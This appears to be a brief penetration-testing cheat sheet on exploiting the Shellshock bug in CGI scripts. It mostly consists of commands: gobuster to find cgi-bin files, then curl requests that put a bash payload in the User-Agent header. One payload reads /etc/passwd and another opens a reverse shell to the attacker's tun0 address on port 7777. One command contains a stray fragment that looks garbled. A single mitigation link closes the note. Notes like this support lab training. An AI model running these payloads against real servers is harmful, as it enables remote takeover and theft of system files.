## Attacking Common Gateway Interface (CGI) Applications - Shellshock

Fuzzing using gobuster (for example)
```bash
$ gobuster dir -u http://$TARGET/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
$ curl -i http://$TARGET/cgi-bin/FILE.cgi

# poc 
$ curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://$TARGET/cgi-bin/access.cgi
$ curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/$tun0/7777 0>&1' http://$TARGET/cgi-bin/access.cgi
```

Mitigation :
https://www.digitalocean.com/community/tutorials/how-to-protect-your-server-against-the-shellshock-bash-vulnerability